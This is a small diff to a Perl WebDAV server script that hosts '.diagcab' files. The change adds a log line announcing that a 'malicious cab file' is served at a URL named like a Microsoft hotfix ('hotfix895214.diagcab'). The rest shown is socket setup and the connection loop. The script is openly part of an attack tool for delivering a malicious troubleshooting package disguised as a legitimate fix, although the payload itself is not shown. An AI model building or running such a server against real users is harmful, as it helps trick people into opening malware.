@@ -26,7 +26,14 @@ my $socket = new IO::Socket::INET (
 );
 
 die "cannot create socket: $!\n" unless $socket;
-mylog("diagcab webdav server waiting for client connections on port $port");
+if ( @ARGV > 0 )
+{
+  mylog('malicious cab file is hosted on:  https://' .$ARGV[0] .'/config/hotfix895214.diagcab');
+}else{
+   mylog("diagcab webdav server waiting for client connections on port $port");
+}
+
+
 
 while(1) {
    my $client_socket = $socket->accept();
